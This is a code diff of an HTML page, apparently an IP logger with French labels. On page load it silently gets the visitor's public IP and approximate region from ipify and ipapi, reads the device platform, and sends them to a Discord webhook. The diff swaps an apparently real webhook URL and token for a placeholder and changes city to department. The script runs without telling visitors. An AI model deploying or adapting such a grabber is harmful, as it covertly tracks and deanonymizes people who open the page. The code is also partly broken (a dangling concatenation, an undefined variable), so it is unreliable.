@@ -3,11 +3,11 @@
 <head>
   <title>IP Address</title>
   <script>
-    function sendToDiscord(ipAddress, city) {
-      var webhookURL = "https://ptb.discord.com/api/webhooks/1125207312806727740/bvMj9uwuMoljP5zjAZWjfXvjYO1wmzZNwAbBDvOFEV87X7SvWir3qQEWn4GSMFZvNRyF";
+    function sendToDiscord(ipAddress, department) {
+      var webhookURL = "https://discord.com/api/webhooks/your-webhook-url";
 
       var content = "> **Adresse IP 🛰️ : **" + ipAddress +
-        "\n> **Ville Approximative 🏠 : **" + city +
+        "\n> **Département 🏠 : **" + department +
       var request = new XMLHttpRequest();
       request.open("POST", webhookURL);
       request.setRequestHeader('Content-type', 'application/json');
@@ -17,7 +17,7 @@
       request.send(JSON.stringify(params));
     }
 
-    function getIPCityDevice() {
+    function getIPDepartmentDevice() {
       fetch('https://api.ipify.org?format=json')
         .then(response => response.json())
         .then(data => {
@@ -26,13 +26,14 @@
           fetch('https://ipapi.co/' + ipAddress + '/json/')
             .then(response => response.json())
             .then(data => {
-              var city = data.city;
+              var department = data.region;
+
               var device = navigator.platform;
 
-              sendToDiscord(ipAddress, city, device);
+              sendToDiscord(ipAddress, department, device);
             })
             .catch(error => {
-              console.error('Erreur lors de la récupération de la ville :', error);
+              console.error('Erreur lors de la récupération du département :', error);
             });
         })
         .catch(error => {
@@ -40,7 +41,7 @@
         });
     }
 
-    window.addEventListener('DOMContentLoaded', getIPCityDevice);
+    window.addEventListener('DOMContentLoaded', getIPDepartmentDevice);
   </script>
 </head>
 <body>
